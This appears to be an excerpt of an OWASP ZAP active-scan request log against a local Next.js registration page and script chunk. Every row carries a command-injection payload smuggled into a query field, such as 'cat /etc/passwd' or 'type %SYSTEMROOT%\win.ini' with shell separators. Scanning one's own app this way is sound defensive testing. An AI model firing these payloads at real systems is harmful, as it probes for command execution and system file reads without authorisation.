1831,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%3Bget-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18911
1832,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%3Bget-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,47,335,18929
1833,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%3Bget-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,64,335,18917
1834,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%3Bget-help+%23&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,58,335,18925
1835,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=cat+%2Fetc%2Fpasswd&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,49,335,18913
1836,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%26cat+%2Fetc%2Fpasswd%26&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,18977
1837,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%3Bcat+%2Fetc%2Fpasswd%3B&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,18957
1838,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%26cat+%2Fetc%2Fpasswd%26%22&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,69,335,19013
1839,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%3Bcat+%2Fetc%2Fpasswd%3B%22&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,18993
1840,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%26cat+%2Fetc%2Fpasswd%26%27&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18989
1841,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%3Bcat+%2Fetc%2Fpasswd%3B%27&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,67,335,18969
1842,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,1242,345,11938274
1843,Fri Sep 25 14:40:38 IST 2026,Fri Sep 25 14:40:38 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=type+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,69,335,18967
1844,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,57,345,11938274
1845,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%26type+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,83,335,19013
1846,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,46,345,11938274
1847,Fri Sep 25 14:40:39 IST 2026,Fri Sep 25 14:40:39 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,60,335,19003
1848,Fri Sep 25 14:40:40 IST 2026,Fri Sep 25 14:40:40 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,53,345,11938274
1849,Fri Sep 25 14:40:40 IST 2026,Fri Sep 25 14:40:40 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,79,335,19067
1850,Fri Sep 25 14:40:41 IST 2026,Fri Sep 25 14:40:41 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,127,345,11938274
1851,Fri Sep 25 14:40:42 IST 2026,Fri Sep 25 14:40:42 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,80,335,19021
1852,Fri Sep 25 14:40:43 IST 2026,Fri Sep 25 14:40:43 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,61,345,11938274
1853,Fri Sep 25 14:40:43 IST 2026,Fri Sep 25 14:40:43 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,93,335,19043
1854,Fri Sep 25 14:40:44 IST 2026,Fri Sep 25 14:40:44 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,56,345,11938274
1855,Fri Sep 25 14:40:44 IST 2026,Fri Sep 25 14:40:44 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,19009
1856,Fri Sep 25 14:40:45 IST 2026,Fri Sep 25 14:40:45 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,69,345,11938274
1857,Fri Sep 25 14:40:46 IST 2026,Fri Sep 25 14:40:46 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=get-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18875
1858,Fri Sep 25 14:40:47 IST 2026,Fri Sep 25 14:40:47 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,54,345,11938274
1859,Fri Sep 25 14:40:47 IST 2026,Fri Sep 25 14:40:48 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%3Bget-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18911
1860,Fri Sep 25 14:40:48 IST 2026,Fri Sep 25 14:40:49 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,116,345,11938274
1861,Fri Sep 25 14:40:49 IST 2026,Fri Sep 25 14:40:49 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%22%3Bget-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,92,335,18929
1862,Fri Sep 25 14:40:51 IST 2026,Fri Sep 25 14:40:51 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%27%3Bget-help&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,191,335,18917
1863,Fri Sep 25 14:40:51 IST 2026,Fri Sep 25 14:40:51 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,199,345,11938274
1864,Fri Sep 25 14:40:52 IST 2026,Fri Sep 25 14:40:52 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly%3Bget-help+%23&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,87,335,18925
1865,Fri Sep 25 14:40:53 IST 2026,Fri Sep 25 14:40:54 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=cat+%2Fetc%2Fpasswd&password=ZAP&phone=9999999999&sport=Cricket,200,OK,96,335,18929
1866,Fri Sep 25 14:40:54 IST 2026,Fri Sep 25 14:40:54 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=get-help,200,OK,62,345,11938274
1867,Fri Sep 25 14:40:54 IST 2026,Fri Sep 25 14:40:54 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%26cat+%2Fetc%2Fpasswd%26&password=ZAP&phone=9999999999&sport=Cricket,200,OK,82,335,18977
1868,Fri Sep 25 14:40:56 IST 2026,Fri Sep 25 14:40:56 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%3Bcat+%2Fetc%2Fpasswd%3B&password=ZAP&phone=9999999999&sport=Cricket,200,OK,86,335,18957
1869,Fri Sep 25 14:40:56 IST 2026,Fri Sep 25 14:40:57 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%3Bget-help,200,OK,107,345,11938274
1870,Fri Sep 25 14:40:56 IST 2026,Fri Sep 25 14:40:56 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%26cat+%2Fetc%2Fpasswd%26%22&password=ZAP&phone=9999999999&sport=Cricket,200,OK,85,335,19013
1871,Fri Sep 25 14:40:58 IST 2026,Fri Sep 25 14:40:59 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%3Bcat+%2Fetc%2Fpasswd%3B%22&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,18993
1872,Fri Sep 25 14:40:59 IST 2026,Fri Sep 25 14:40:59 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%26cat+%2Fetc%2Fpasswd%26%27&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,18989
1873,Fri Sep 25 14:40:59 IST 2026,Fri Sep 25 14:40:59 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%3Bget-help,200,OK,57,345,11938274
1874,Fri Sep 25 14:41:00 IST 2026,Fri Sep 25 14:41:00 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%3Bcat+%2Fetc%2Fpasswd%3B%27&password=ZAP&phone=9999999999&sport=Cricket,200,OK,103,335,18969
1875,Fri Sep 25 14:41:01 IST 2026,Fri Sep 25 14:41:01 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=type+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,82,335,18983
1876,Fri Sep 25 14:41:01 IST 2026,Fri Sep 25 14:41:01 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%26type+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,97,335,19013
1877,Fri Sep 25 14:41:02 IST 2026,Fri Sep 25 14:41:02 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,105,335,19003
1878,Fri Sep 25 14:41:02 IST 2026,Fri Sep 25 14:41:02 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%3Bget-help,200,OK,68,345,11938274
1879,Fri Sep 25 14:41:02 IST 2026,Fri Sep 25 14:41:02 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&password=ZAP&phone=9999999999&sport=Cricket,200,OK,85,335,19067
1880,Fri Sep 25 14:41:03 IST 2026,Fri Sep 25 14:41:03 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,93,335,19021
1881,Fri Sep 25 14:41:04 IST 2026,Fri Sep 25 14:41:04 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&password=ZAP&phone=9999999999&sport=Cricket,200,OK,96,335,19043
1882,Fri Sep 25 14:41:04 IST 2026,Fri Sep 25 14:41:04 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP&phone=9999999999&sport=Cricket,200,OK,126,335,19009
1883,Fri Sep 25 14:41:05 IST 2026,Fri Sep 25 14:41:05 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%3Bget-help+%23,200,OK,51,345,11938274
1884,Fri Sep 25 14:41:05 IST 2026,Fri Sep 25 14:41:05 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=get-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,18891
1885,Fri Sep 25 14:41:06 IST 2026,Fri Sep 25 14:41:06 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%3Bget-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,92,335,18911
1886,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%22%3Bget-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,83,335,18929
1887,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%27%3Bget-help&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18917
1888,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP%3Bget-help+%23&password=ZAP&phone=9999999999&sport=Cricket,200,OK,60,335,18925
1889,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=cat+%2Fetc%2Fpasswd&phone=9999999999&sport=Cricket,200,OK,81,335,18929
1890,Fri Sep 25 14:41:07 IST 2026,Fri Sep 25 14:41:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%26cat+%2Fetc%2Fpasswd%26&phone=9999999999&sport=Cricket,200,OK,58,335,18977
1891,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%3Bcat+%2Fetc%2Fpasswd%3B&phone=9999999999&sport=Cricket,200,OK,71,335,18957
1892,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%26cat+%2Fetc%2Fpasswd%26%22&phone=9999999999&sport=Cricket,200,OK,79,335,19013
1893,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%3Bcat+%2Fetc%2Fpasswd%3B%22&phone=9999999999&sport=Cricket,200,OK,130,335,18993
1894,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%26cat+%2Fetc%2Fpasswd%26%27&phone=9999999999&sport=Cricket,200,OK,59,335,18989
1895,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%3Bcat+%2Fetc%2Fpasswd%3B%27&phone=9999999999&sport=Cricket,200,OK,85,335,18969
1896,Fri Sep 25 14:41:08 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=type+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,117,335,18983
1897,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%26type+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,57,335,19013
1898,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,61,335,19003
1899,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&phone=9999999999&sport=Cricket,200,OK,55,335,19067
1900,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,57,335,19021
1901,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&phone=9999999999&sport=Cricket,200,OK,70,335,19043
1902,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&phone=9999999999&sport=Cricket,200,OK,58,335,19009
1903,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=get-help&phone=9999999999&sport=Cricket,200,OK,57,335,18891
1904,Fri Sep 25 14:41:09 IST 2026,Fri Sep 25 14:41:09 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%3Bget-help&phone=9999999999&sport=Cricket,200,OK,66,335,18911
1905,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%22%3Bget-help&phone=9999999999&sport=Cricket,200,OK,60,335,18929
1906,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%27%3Bget-help&phone=9999999999&sport=Cricket,200,OK,55,335,18917
1907,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP%3Bget-help+%23&phone=9999999999&sport=Cricket,200,OK,56,335,18925
1908,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=cat+%2Fetc%2Fpasswd&sport=Cricket,200,OK,46,335,18901
1909,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%26cat+%2Fetc%2Fpasswd%26&sport=Cricket,200,OK,48,335,18977
1910,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%3Bcat+%2Fetc%2Fpasswd%3B&sport=Cricket,200,OK,50,335,18957
1911,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%22%26cat+%2Fetc%2Fpasswd%26%22&sport=Cricket,200,OK,48,335,19013
1912,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%22%3Bcat+%2Fetc%2Fpasswd%3B%22&sport=Cricket,200,OK,53,335,18993
1913,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%27%26cat+%2Fetc%2Fpasswd%26%27&sport=Cricket,200,OK,48,335,18989
1914,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%27%3Bcat+%2Fetc%2Fpasswd%3B%27&sport=Cricket,200,OK,49,335,18969
1915,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:10 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=type+%25SYSTEMROOT%25%5Cwin.ini&sport=Cricket,200,OK,57,335,18955
1916,Fri Sep 25 14:41:10 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%26type+%25SYSTEMROOT%25%5Cwin.ini&sport=Cricket,200,OK,48,335,19013
1917,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&sport=Cricket,200,OK,49,335,19003
1918,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&sport=Cricket,200,OK,60,335,19067
1919,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&sport=Cricket,200,OK,50,335,19021
1920,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&sport=Cricket,200,OK,48,335,19043
1921,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&sport=Cricket,200,OK,53,335,19009
1922,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=get-help&sport=Cricket,200,OK,50,335,18863
1923,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%3Bget-help&sport=Cricket,200,OK,54,335,18911
1924,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%22%3Bget-help&sport=Cricket,200,OK,51,335,18929
1925,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%27%3Bget-help&sport=Cricket,200,OK,49,335,18917
1926,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999%3Bget-help+%23&sport=Cricket,200,OK,53,335,18925
1927,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=cat+%2Fetc%2Fpasswd,200,OK,54,335,18913
1928,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:11 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%26cat+%2Fetc%2Fpasswd%26,200,OK,48,335,18977
1929,Fri Sep 25 14:41:11 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,55,335,18957
1930,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,48,335,19013
